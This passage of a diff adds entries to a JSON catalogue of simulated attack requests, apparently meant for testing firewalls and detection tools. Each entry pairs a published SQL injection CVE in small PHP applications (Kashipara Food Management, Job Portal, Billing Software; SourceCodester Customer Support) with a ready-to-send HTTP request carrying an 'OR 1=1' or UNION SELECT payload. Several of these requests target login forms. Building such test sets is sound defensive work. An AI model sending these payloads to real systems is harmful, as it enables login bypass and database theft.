+    "value": {
+      "input": "GET /stock_edit.php?item_type='%20OR%201=1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2024-0290"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0290",
+        "link": "https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability15.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0290",
+        "link": "https://vuldb.com/?id.249851"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0289 - Kashipara Food Management System SQL Injection",
+    "displayName": "CVE-2024-0289 - Kashipara Food Management System SQL Injection",
+    "description": "Kashipara Food Management System 1.0 is vulnerable to SQL injection via the 'itemype' argument of stock_entry_submit.php. The request sends a boolean-based payload (' OR 1=1-- -) in the itemype field. HTTP method POST inferred (stock entry submit form handler). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability14.md (PoC)\n- https://vuldb.com/?id.249850 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0289 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /stock_entry_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nitemype='+OR+1=1--+-\n"
+    },
+    "cves": [
+      "CVE-2024-0289"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0289",
+        "link": "https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability14.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0289",
+        "link": "https://vuldb.com/?id.249850"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0288 - Kashipara Food Management System SQL Injection",
+    "displayName": "CVE-2024-0288 - Kashipara Food Management System SQL Injection",
+    "description": "Kashipara Food Management System 1.0 is vulnerable to SQL injection via the 'product_name' argument of rawstock_used_damaged_submit.php. The request sends a boolean-based payload (' OR 1=1-- -) in the product_name field. HTTP method POST inferred (raw-stock submit form handler). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability12.md (PoC)\n- https://vuldb.com/?id.249849 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0288 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /rawstock_used_damaged_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nproduct_name='+OR+1=1--+-\n"
+    },
+    "cves": [
+      "CVE-2024-0288"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0288",
+        "link": "https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability12.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0288",
+        "link": "https://vuldb.com/?id.249849"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0287 - Kashipara Food Management System SQL Injection",
+    "displayName": "CVE-2024-0287 - Kashipara Food Management System SQL Injection",
+    "description": "Kashipara Food Management System 1.0 is vulnerable to SQL injection via the 'printid' argument of itemBillPdf.php. The request sends a UNION SELECT payload in the printid query parameter. HTTP method GET inferred (bill PDF id parameter). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability5.md (PoC)\n- https://vuldb.com/?id.249848 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0287 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /itemBillPdf.php?printid=1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2024-0287"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0287",
+        "link": "https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability5.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0287",
+        "link": "https://vuldb.com/?id.249848"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2024-0281 - Kashipara Food Management System SQL Injection",
     "displayName": "CVE-2024-0281 - Kashipara Food Management System SQL Injection",
     "description": "Kashipara Food Management System up to 1.0 is vulnerable to SQL injection in the 'password' parameter of loginCheck.php (the login form handler). The request sends an OR-based SQL injection payload (' OR 1=1-- -) in the password parameter. No vendor WAF rule found; built from the VulDB entry-point description and the E1CHO PoC. HTTP method inferred as POST (file naming indicates a login form handler; VulDB does not state the method or an install folder, so the path is the bare file name).\n\nReferences used to recreate this request:\n- https://github.com/E1CHO/cve_hub/blob/main/Food%20Management%20System/Food%20Management%20System%20-%20vuln%2013.pdf (PoC)\n- https://vuldb.com/?id.249836 (VulDB advisory with file/parameter)\n- https://www.cve.org/CVERecord?id=CVE-2024-0281 (CVE record)",
@@ -273848,6 +274816,546 @@
       {
         "title": "vuldb for CVE-2024-0270",
         "link": "https://vuldb.com/?id.249825"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49968 - SourceCodester Customer Support System SQL Injection",
+    "displayName": "CVE-2023-49968 - SourceCodester Customer Support System SQL Injection",
+    "description": "SourceCodester Customer Support System v1 is vulnerable to SQL injection in the id parameter of /customer_support/manage_department.php. The request sends a boolean-based SQLi payload (' OR 1=1-- -) in id. HTTP method inferred as GET (id-style read parameter) per spec convention; the PoC repository was not directly fetchable. No vendor WAF rule found; built from the CVE/advisory entry point.\n\nReferences used to recreate this request:\n- https://github.com/geraldoalcantara/CVE-2023-49968 (PoC, not directly fetchable)\n- https://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html (product)\n- https://www.cve.org/CVERecord?id=CVE-2023-49968 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /customer_support/manage_department.php?id=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-49968"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-49968",
+        "link": "https://github.com/geraldoalcantara/CVE-2023-49968"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49689 - Kashipara Job Portal SQL Injection",
+    "displayName": "CVE-2023-49689 - Kashipara Job Portal SQL Injection",
+    "description": "Kashipara Job Portal v1.0 is vulnerable to unauthenticated SQL injection in the JobId parameter of Employer/DeleteJob.php. The request sends a boolean-based SQLi payload (' OR 1=1-- -) in JobId. HTTP method inferred as GET (delete/id-style parameter) per spec convention; advisory shows no example request. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/pollini/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49689 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Employer/DeleteJob.php?JobId=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-49689"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49689",
+        "link": "https://fluidattacks.com/advisories/pollini/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49688 - Kashipara Job Portal SQL Injection",
+    "displayName": "CVE-2023-49688 - Kashipara Job Portal SQL Injection",
+    "description": "Kashipara Job Portal v1.0 is vulnerable to unauthenticated SQL injection in the txtUser parameter of login.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in txtUser. HTTP method inferred as POST (login form) per spec convention; advisory shows no example request. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/pollini/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49688 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ntxtUser=%27%20OR%201%3D1--%20-&txtPass=dummy\n"
+    },
+    "cves": [
+      "CVE-2023-49688"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49688",
+        "link": "https://fluidattacks.com/advisories/pollini/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49681 - Kashipara Job Portal SQL Injection",
+    "displayName": "CVE-2023-49681 - Kashipara Job Portal SQL Injection",
+    "description": "Kashipara Job Portal v1.0 is vulnerable to unauthenticated SQL injection in the cmbQual parameter of Employer/InsertWalkin.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in cmbQual. HTTP method inferred as POST (insert form action) per spec convention; advisory shows no example request. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/pollini/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49681 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /Employer/InsertWalkin.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncmbQual=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49681"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49681",
+        "link": "https://fluidattacks.com/advisories/pollini/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49677 - Kashipara Job Portal SQL Injection",
+    "displayName": "CVE-2023-49677 - Kashipara Job Portal SQL Injection",
+    "description": "Kashipara Job Portal v1.0 is vulnerable to unauthenticated SQL injection in the cmbQual parameter of Employer/InsertJob.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in cmbQual. HTTP method inferred as POST (insert form action) per spec convention; advisory shows no example request. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/pollini/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49677 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /Employer/InsertJob.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncmbQual=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49677"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49677",
+        "link": "https://fluidattacks.com/advisories/pollini/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49666 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49666 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the custmer_details parameter of submit_material_list.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in custmer_details. HTTP method is POST (form submit action); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49666 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /submit_material_list.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncustmer_details=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49666"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49666",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49665 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49665 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the quantity[] parameter of submit_delivery_list.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in quantity[]. HTTP method is POST (code reads $_POST); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49665 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /submit_delivery_list.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nquantity%5B%5D=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49665"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49665",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49658 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49658 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the bank_details parameter of party_submit.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in bank_details. HTTP method is POST (form submit action); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49658 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /party_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nbank_details=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49658"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49658",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49641 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49641 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the username parameter of loginCheck.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in username. HTTP method is POST (code reads $_POST); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49641 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /loginCheck.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nusername=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49641"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49641",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49639 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49639 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the customer_details parameter of buyer_invoice_submit.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in customer_details. HTTP method is POST (code reads $_POST); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49639 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /buyer_invoice_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncustomer_details=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49639"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49639",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49633 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49633 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the buyer_address parameter of buyer_detail_submit.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in buyer_address. HTTP method is POST (form submit action); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49633 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /buyer_detail_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nbuyer_address=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49633"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49633",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-49625 - Kashipara Billing Software SQL Injection",
+    "displayName": "CVE-2023-49625 - Kashipara Billing Software SQL Injection",
+    "description": "Kashipara Billing Software v1.0 is vulnerable to unauthenticated SQL injection in the id parameter of partylist_edit_submit.php. The request POSTs a boolean-based SQLi payload (' OR 1=1-- -) in id. HTTP method is POST (edit form submit action); advisory shows no example request so the method was confirmed/inferred from the PHP handler. No vendor WAF rule found; built from the Fluid Attacks advisory entry point.\n\nReferences used to recreate this request:\n- https://fluidattacks.com/advisories/zimerman/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-49625 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /partylist_edit_submit.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-49625"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2023-49625",
+        "link": "https://fluidattacks.com/advisories/zimerman/"
       }
     ],
     "public": false,
